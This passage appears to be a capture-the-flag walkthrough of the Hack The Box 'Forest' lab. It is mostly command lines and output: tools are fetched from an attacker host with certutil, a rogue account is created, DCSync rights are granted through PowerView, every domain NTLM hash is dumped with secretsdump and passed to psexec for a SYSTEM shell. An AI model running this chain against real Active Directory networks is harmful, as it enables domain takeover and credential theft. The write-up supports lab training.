+-rw-r--r-- 1 root root 43696 Noll   7 21:07 nc64.exe
+-rw-r--r-- 1 root root  7168 Noll   7 21:06 shell.exe
+
+UPLOAD TO SHARPHOUND TO FOREST
+certutil -f -split -urlcache http://10.10.14.8/SharpHound.exe
+
+ALTERNATIVELY USE EVILRM FOR REVERSE SHELL AS CAN UPLOAD AND DOWNLOAD FILES
+root@kali:~/htb/forest# gem install evil-winrm
+
+root@kali:~/htb/forest# evil-winrm -i 10.10.10.161 -u svc-alfresco -p s3rvice
+
+Evil-WinRM shell v2.3
+
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> dir
+*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> upload SharpHound.exe
+Info: Uploading SharpHound.exe to C:\Users\svc-alfresco\Documents\SharpHound.exe
+
+                                                             
+Data: 1110696 bytes of 1110696 bytes copied
+
+Info: Upload successful!
+
+*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> dir
+
+
+    Directory: C:\Users\svc-alfresco\Documents
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----        12/8/2020   1:27 PM         833024 SharpHound.exe
+
+
+*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> .\SharpHound.exe -c All
+-----------------------------------------------
+Initializing SharpHound at 1:28 PM on 12/8/2020
+-----------------------------------------------
+
+Resolved Collection Methods: Group, Sessions, LoggedOn, Trusts, ACL, ObjectProps, LocalGroups, SPNTargets, Container
+
+[+] Creating Schema map for domain HTB.LOCAL using path CN=Schema,CN=Configuration,DC=HTB,DC=LOCAL
+[+] Cache File not Found: 0 Objects in cache
+
+[+] Pre-populating Domain Controller SIDS
+Status: 0 objects finished (+0) -- Using 21 MB RAM
+Status: 123 objects finished (+123 61.5)/s -- Using 28 MB RAM
+Enumeration finished in 00:00:02.6046530
+Compressing data to .\20201208132809_BloodHound.zip
+You can upload this file directly to the UI
+
+SharpHound Enumeration Completed at 1:28 PM on 12/8/2020! Happy Graphing!
+
+*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> dir
+
+
+    Directory: C:\Users\svc-alfresco\Documents
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----        12/8/2020   1:28 PM          15093 20201208132809_BloodHound.zip
+-a----        12/8/2020   1:28 PM          23611 MzZhZTZmYjktOTM4NS00NDQ3LTk3OGItMmEyYTVjZjNiYTYw.bin
+-a----        12/8/2020   1:27 PM         833024 SharpHound.exe
+
+
+*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> download 20201208132809_BloodHound.zip
+Info: Downloading C:\Users\svc-alfresco\Documents\20201208132809_BloodHound.zip to 20201208132809_BloodHound.zip
+
+                                                             
+Info: Download successful!
+
+START BLOODHOUND ON KALI AND LOGIN
+root@kali:~/htb/forest# bloodhound 
+
+IMPORT BLOODHOUND ZIPPED FILE TO BLOODHOUND PORTAL
+
+Bloodhound proposal is
+
+    svc-alfresco user is member of group Account operator -> The members of the group ACCOUNT OPERATORS@HTB.LOCAL have GenericAll privileges to the group EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL.
+    The members of the group EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL have permissions to modify the DACL (Discretionary Access Control List) on the domain HTB.LOCAL. -> To abuse WriteDacl to a domain object, you may grant yourself the DcSync privileges.
+
+ADD ALFRESCO ACCOUNT TO EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL
+net group "Exchange Windows Permissions" svc-alfresco /add
+
+
+
+PRIVESC AD LINK
+https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/
+
+DOWNLOAD POWERVIEW
+root@kali:~/htb/forest# wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1
+
+ADD USER MEMBER OF GROUP EXCHANGE WINDOWS PERMISSIONS
+*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> net user /add hackor bloodhound
+The command completed successfully.
+
+*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> net group /add "Domain Admins" hackor
+net.exe : System error 5 has occurred.
+    + CategoryInfo          : NotSpecified: (System error 5 has occurred.:String) [], RemoteException
+    + FullyQualifiedErrorId : NativeCommandError
+
+Access is denied.
+
+*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> net group /add "Exchange Windows Permissions" hackor
+The command completed successfully.
+
+*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> net localgroup "Remote Management Users" /add hackor
+The command completed successfully.
+
+*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> net user hackor
+User name                    hackor
+Full Name
+Comment
+User's comment
+Country/region code          000 (System Default)
+Account active               Yes
+Account expires              Never
+
+Password last set            12/8/2020 2:27:03 PM
+Password expires             1/19/2021 2:27:03 PM
+Password changeable          12/9/2020 2:27:03 PM
+Password required            Yes
+User may change password     Yes
+
+Workstations allowed         All
+Logon script
+User profile
+Home directory
+Last logon                   Never
+
+Logon hours allowed          All
+
+Local Group Memberships      *Remote Management Use
+Global Group memberships     *Exchange Windows Perm*Domain Users
+The command completed successfully.
+
+LOGIN AS NEW USER AND WriteDacl DCSync privilege
+
+root@kali:~/htb/forest# evil-winrm -i 10.10.10.161 -u hackor -p bloodhound
+
+Evil-WinRM shell v2.3
+
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:\Users\hackor\Documents> $SecPassword = ConvertTo-SecureString 'bloodhound' -AsPlainText -Force
+*Evil-WinRM* PS C:\Users\hackor\Documents> $Cred = New-Object System.Management.Automation.PSCredential('HTB.LOCAL\hackor', $SecPassword)
+*Evil-WinRM* PS C:\Users\hackor\Documents> $Cred
+
+UserName                             Password
+--------                             --------
+HTB.LOCAL\hackor System.Security.SecureString
+
+
+*Evil-WinRM* PS C:\Users\hackor\Documents> upload PowerView.ps1
+Info: Uploading PowerView.ps1 to C:\Users\hackor\Documents\PowerView.ps1
+
+                                                             
+Data: 1027036 bytes of 1027036 bytes copied
+
+Info: Upload successful!
+
+*Evil-WinRM* PS C:\Users\hackor\Documents> . .\PowerView.ps1
+*Evil-WinRM* PS C:\Users\hackor\Documents> Add-DomainObjectAcl -Credential $Cred -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity hackor -Rights DCSync
+
+DUMP THE NTLM HASHES
+root@kali:~/htb/forest# secretsdump.py -dc-ip 10.10.10.161 -just-dc-ntlm hackor@10.10.10.161
+Impacket v0.9.22.dev1+20201015.130615.81eec85a - Copyright 2020 SecureAuth Corporation
+
+Password:
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:819af826bb148e603acb0f33d17632f8:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+htb.local\$331000-VK4ADACQNUCA:1123:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+htb.local\SM_2c8eef0a09b545acb:1124:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+htb.local\SM_ca8c2ed5bdab4dc9b:1125:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+htb.local\SM_75a538d3025e4db9a:1126:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+htb.local\SM_681f53d4942840e18:1127:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+htb.local\SM_1b41c9286325456bb:1128:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+htb.local\SM_9b69f1b9d2cc45549:1129:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+htb.local\SM_7c96b981967141ebb:1130:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+htb.local\SM_c75ee099d0a64c91b:1131:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+htb.local\SM_1ffab36a2f5f479cb:1132:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+htb.local\HealthMailboxc3d7722:1134:aad3b435b51404eeaad3b435b51404ee:4761b9904a3d88c9c9341ed081b4ec6f:::
+htb.local\HealthMailboxfc9daad:1135:aad3b435b51404eeaad3b435b51404ee:5e89fd2c745d7de396a0152f0e130f44:::
+htb.local\HealthMailboxc0a90c9:1136:aad3b435b51404eeaad3b435b51404ee:3b4ca7bcda9485fa39616888b9d43f05:::
+htb.local\HealthMailbox670628e:1137:aad3b435b51404eeaad3b435b51404ee:e364467872c4b4d1aad555a9e62bc88a:::
+htb.local\HealthMailbox968e74d:1138:aad3b435b51404eeaad3b435b51404ee:ca4f125b226a0adb0a4b1b39b7cd63a9:::
+htb.local\HealthMailbox6ded678:1139:aad3b435b51404eeaad3b435b51404ee:c5b934f77c3424195ed0adfaae47f555:::
+htb.local\HealthMailbox83d6781:1140:aad3b435b51404eeaad3b435b51404ee:9e8b2242038d28f141cc47ef932ccdf5:::
+htb.local\HealthMailboxfd87238:1141:aad3b435b51404eeaad3b435b51404ee:f2fa616eae0d0546fc43b768f7c9eeff:::
+htb.local\HealthMailboxb01ac64:1142:aad3b435b51404eeaad3b435b51404ee:0d17cfde47abc8cc3c58dc2154657203:::
+htb.local\HealthMailbox7108a4e:1143:aad3b435b51404eeaad3b435b51404ee:d7baeec71c5108ff181eb9ba9b60c355:::
+htb.local\HealthMailbox0659cc1:1144:aad3b435b51404eeaad3b435b51404ee:900a4884e1ed00dd6e36872859c03536:::
+htb.local\sebastien:1145:aad3b435b51404eeaad3b435b51404ee:96246d980e3a8ceacbf9069173fa06fc:::
+htb.local\lucinda:1146:aad3b435b51404eeaad3b435b51404ee:4c2af4b2cd8a15b1ebd0ef6c58b879c3:::
+htb.local\svc-alfresco:1147:aad3b435b51404eeaad3b435b51404ee:9248997e4ef68ca2bb47ae4e6f128668:::
+htb.local\andy:1150:aad3b435b51404eeaad3b435b51404ee:29dfccaf39618ff101de5165b19d524b:::
+htb.local\mark:1151:aad3b435b51404eeaad3b435b51404ee:9e63ebcb217bf3c6b27056fdcb6150f7:::
+htb.local\santi:1152:aad3b435b51404eeaad3b435b51404ee:483d4c70248510d8e0acb6066cd89072:::
+hackor:7602:aad3b435b51404eeaad3b435b51404ee:d1a32629af09ecfb400efc96117733d9:::
+FOREST$:1000:aad3b435b51404eeaad3b435b51404ee:e7f889b191dd1898ee10f3e30cfae1a9:::
+EXCH01$:1103:aad3b435b51404eeaad3b435b51404ee:050105bb043f5b8ffc3a9fa99b5ef7c1:::
+[*] Cleaning up... 
+
+GET ROOT SHELL
+root@kali:~/htb/forest# psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6 administrator@10.10.10.161
+Impacket v0.9.22.dev1+20201015.130615.81eec85a - Copyright 2020 SecureAuth Corporation
+
+[*] Requesting shares on 10.10.10.161.....
+[*] Found writable share ADMIN$
+[*] Uploading file lYLyNkHw.exe
+[*] Opening SVCManager on 10.10.10.161.....
+[*] Creating service CYRT on 10.10.10.161.....
+[*] Starting service CYRT.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 10.0.14393]
+(c) 2016 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>whoami
+nt authority\system
+
+GET ROOT FLAG
+C:\Windows\system32>type C:\Users\Administrator\Desktop\root.txt
+#################################
+
+OR
+wmiexec.py hackor@10.10.10.161
+
